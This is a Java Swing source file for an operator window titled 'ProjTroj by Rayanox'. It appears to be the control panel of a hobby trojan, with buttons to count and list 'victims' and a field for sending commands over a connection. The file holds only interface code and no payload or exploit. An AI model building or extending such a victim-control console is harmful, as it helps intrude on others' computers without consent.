package Vues;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.GridLayout;
import java.awt.Insets;
import java.awt.ScrollPane;
import java.awt.Window;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.io.IOException;
import java.util.ArrayList;

import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.text.DefaultHighlighter;
import javax.swing.text.Highlighter;

import com.sun.java.swing.plaf.windows.resources.windows;

import Modele.Connexion;



public class Fenetre extends JFrame{
	
	
	//--- General
	private Connexion connexion; //Faire gaffe -> tester car peut etre null
	private String [] HistoriqueRequete;
	
	
	//--- Panel General
	private JPanel panelGeneral;
			
	//--- Reponse
	private JTextArea AffichageReponses;
	private JScrollPane conteneurScrollReponse;
	
	//--- Requete
	private JPanel panelRequete;
	private JTextField AffichageRequetes;
	
	//---- Boutons Communs
	private ArrayList<JButton> listeBoutons;
	private JPanel panelBoutons;
	private JButton bouton1;
	private JButton bouton2;
	private JButton bouton3;
	private JButton bouton4;
	private JButton bouton5;
	private final Color couleurAffichageReponse = Color.green;
	
	//--- Boutons mode connecte
	
	
	
	
	
	public Fenetre () {
		super();
		this.HistoriqueRequete = new String [10];
		
		
		//JFrame
		this.setTitle("ProjTroj by Rayanox");
		this.setLocation(200, 200);
		this.setVisible(true);
		this.setDefaultCloseOperation(EXIT_ON_CLOSE);
		
		
		//---Affichage Reponse			
		this.AffichageReponses = new JTextArea();
		this.AffichageReponses.setMargin(new Insets(10, 10,10,10));
		this.AffichageReponses.setBackground(Color.black);
		this.AffichageReponses.setForeground(couleurAffichageReponse);
		this.AffichageReponses.setLineWrap(true);
		this.AffichageReponses.setEditable(false);
		this.conteneurScrollReponse = new JScrollPane(this.AffichageReponses, JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED, JScrollPane.HORIZONTAL_SCROLLBAR_NEVER);
		
		//--- Panel Boutons
				this.listeBoutons = new ArrayList<JButton>();
				this.panelBoutons = new JPanel();
				this.panelBoutons.setLayout(new GridLayout(5, 1));
				this.initialiserBoutonsModeConnecte();
				this.initialiserBoutonsCommuns();
				
		this.setPreferredSize(new Dimension(500+this.listeBoutons.get(0).getPreferredSize().width, 500));	
		
		//--- Affichage Requetes
		panelRequete = new JPanel(new FlowLayout());
		this.AffichageRequetes = new JTextField();
		this.AffichageRequetes.setPreferredSize(new Dimension(this.getPreferredSize().width, 100));
		this.AffichageRequetes.setMargin(new Insets(10, 10,10,10));
		this.AffichageRequetes.setBackground(Color.yellow);
		panelRequete.add(this.AffichageRequetes);
			
	
		
		
		
		//--- Panel General
			this.panelGeneral = new JPanel(new BorderLayout());
			this.panelGeneral.add(this.conteneurScrollReponse, BorderLayout.CENTER);
			this.panelGeneral.add(panelRequete, BorderLayout.SOUTH);
			this.panelGeneral.add(this.panelBoutons, BorderLayout.EAST);
		
		
		
		
		this.add(panelGeneral);
		this.pack();

		
		this.initialiserChamps();
	}
	
	public void setConnexion(Connexion c) {
		this.connexion = c;
	}

	private void initialiserBoutonsCommuns() {
		
		int largeurBoutons = 50, hauteurBoutons = 20;
		String texteBouton;
		
		texteBouton = "Nombre d'utilisateurs connect�s";
		this.bouton1 = new JButton();
		this.bouton1.setText(texteBouton);
		this.bouton1.addMouseListener(new  MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent arg0) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mousePressed(MouseEvent arg0) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseExited(MouseEvent arg0) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseEntered(MouseEvent arg0) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseClicked(MouseEvent arg0) {
				try {
					String req = "1"; //Nombre d'utilisateurs connect�s
					connexion.envoyerMessage(req);
				} catch (IOException e) {
					// TODO Auto-generated catch block
					addInOutputBox(e.getMessage());
				}
				
			}
		});
		
		texteBouton = "Nombre de victimes";
		this.bouton2 = new JButton();
		this.bouton2.setText(texteBouton);
		this.bouton2.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent arg0) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mousePressed(MouseEvent arg0) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseExited(MouseEvent arg0) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseEntered(MouseEvent arg0) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseClicked(MouseEvent arg0) {
				try {
					String req = "2";
					connexion.envoyerMessage(req);
				} catch (IOException e) {
					// TODO Auto-generated catch block
					addInOutputBox(e.getMessage());
				}
			}
		});
		
		texteBouton = "Liste de victimes";
		this.bouton3 = new JButton();
		this.bouton3.setText(texteBouton);
		this.bouton3.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent arg0) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mousePressed(MouseEvent arg0) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseExited(MouseEvent arg0) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseEntered(MouseEvent arg0) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseClicked(MouseEvent arg0) {
				// TODO Auto-generated method stub
				try {
					String req = "3";
					connexion.envoyerMessage(req);
				} catch (IOException e) {
					// TODO Auto-generated catch block
					addInOutputBox(e.getMessage());
				}
			}
		});
		 
		this.bouton4 = new JButton();
		this.bouton4.setText("Effacer ecran +\nSurprise");
		this.bouton4.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent arg0) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mousePressed(MouseEvent arg0) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseExited(MouseEvent arg0) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseEntered(MouseEvent arg0) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseClicked(MouseEvent arg0) {
				//printErreurMessage("Voici un message d'erreur de test");
				AffichageReponses.setText("");
				popup("Le createur de ce magnifique programme est Rayanox :\n Vous devez prier votre Boss !\n\nRayanox !\nRayanox !\nRayanox !");
			}
		});
		
		texteBouton = "AIDE";
		this.bouton5 = new JButton();
		this.bouton5.setText(texteBouton);
		this.bouton5.addMouseListener(new  MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e1) {
				try {
					String req = "help";
					connexion.envoyerMessage(req);
				} catch (IOException e) {
					// TODO Auto-generated catch block
					addInOutputBox(e.getMessage());
				}
			}
		});
		
		//Ajout des boutons � la liste
		this.listeBoutons.add(bouton1);
		this.listeBoutons.add(bouton2);
		this.listeBoutons.add(bouton3);
		this.listeBoutons.add(bouton4);
		this.listeBoutons.add(bouton5);
		
		
		
		//R�glage tailles
		for (JButton bouton : listeBoutons) {
			if(bouton.getPreferredSize().width > largeurBoutons) largeurBoutons = bouton.getPreferredSize().width;
		}
		this.bouton1.setPreferredSize(new Dimension(largeurBoutons, hauteurBoutons));
		this.bouton2.setPreferredSize(new Dimension(largeurBoutons, hauteurBoutons));
		this.bouton3.setPreferredSize(new Dimension(largeurBoutons, hauteurBoutons));
		this.bouton4.setPreferredSize(new Dimension(largeurBoutons, hauteurBoutons));
		this.bouton5.setPreferredSize(new Dimension(largeurBoutons, hauteurBoutons));
		
		
		//Ajout dans panelBouton
		this.panelBoutons.add(this.bouton1);
		this.panelBoutons.add(this.bouton2);
		this.panelBoutons.add(this.bouton3);
		this.panelBoutons.add(this.bouton4);
		this.panelBoutons.add(this.bouton5);
	}

	public void addInOutputBox(String message) {
		// TODO Auto-generated method stub
		this.AffichageReponses.setText(this.AffichageReponses.getText()+"\n"+message);
		this.AffichageReponses.setCaretPosition(this.AffichageReponses.getText().length());
	}

	protected String getTextInInputBox() {
		return this.AffichageRequetes.getText();
	}

	private void initialiserBoutonsModeConnecte() {
		// TODO Auto-generated method stub
		
	}

	private void initialiserChamps() {
		this.AffichageRequetes.addKeyListener(new KeyListener() {
			
			private int pointeurIndiceActuel = 0; //indice utile pour le positionnement dans l'historique des requetes tapp�es
			
			@Override
			public void keyTyped(KeyEvent arg0) {
				
			}
			
			@Override
			public void keyReleased(KeyEvent arg0) {
				// TODO Auto-generated method stub
				if(arg0.getKeyCode() == KeyEvent.VK_ENTER) {
					String texte = AffichageRequetes.getText();
					if(texte.length()>0)  { //texte valide
						if(!texte.equals(HistoriqueRequete[0])) ajouterDansTableauHistorique(texte);						
						try {
							connexion.envoyerMessage(texte);
						} catch (IOException e) {
							printErreurMessage("ERREUR LORS DE L'ENVOIE DU MESSAGE");
						}
						AffichageRequetes.setText("");
					}
					pointeurIndiceActuel = -1;					
				}else if(arg0.getKeyCode() == KeyEvent.VK_UP) {
					if(pointeurIndiceActuel < HistoriqueRequete.length-1 && HistoriqueRequete[pointeurIndiceActuel+1] != null ) pointeurIndiceActuel++;
					AffichageRequetes.setText(HistoriqueRequete[pointeurIndiceActuel]);
				} else if(arg0.getKeyCode() == KeyEvent.VK_DOWN) {
					if(pointeurIndiceActuel > 0) {
						pointeurIndiceActuel--;
						AffichageRequetes.setText(HistoriqueRequete[pointeurIndiceActuel]);
					}else {
						AffichageRequetes.setText("");
						if(pointeurIndiceActuel> -1) pointeurIndiceActuel--;
					}
				}  
			}
			
			@Override
			public void keyPressed(KeyEvent arg0) {
				// TODO Auto-generated method stub
				
			}
		});
		
		
		
	}

	//TODO NE FONCTIONNE PAS (-> n'affiche pas en rouge)
	protected void printErreurMessage(String message) {
		this.AffichageReponses.setOpaque(true);
		this.AffichageReponses.setForeground(Color.red);
		addInOutputBox(message);
		this.AffichageReponses.setForeground(this.couleurAffichageReponse);		
	}

	protected void ajouterDansTableauHistorique(String text) {
		String tmp, tmp2;
		tmp = this.HistoriqueRequete[0];
		this.HistoriqueRequete[0] = text;
		
		for(int i=1; i< HistoriqueRequete.length; i++) {
			if(this.HistoriqueRequete[i] != null) {
				tmp2 = tmp;
				tmp = HistoriqueRequete[i];
				HistoriqueRequete[i]= tmp2;				
			}else {
				this.HistoriqueRequete[i] = tmp;
				break;
			}
		}
	}
	
	private void popup(String message) {
		JOptionPane popup = new JOptionPane();
		popup.showMessageDialog(new JFrame(), message);
	}
	
	
}
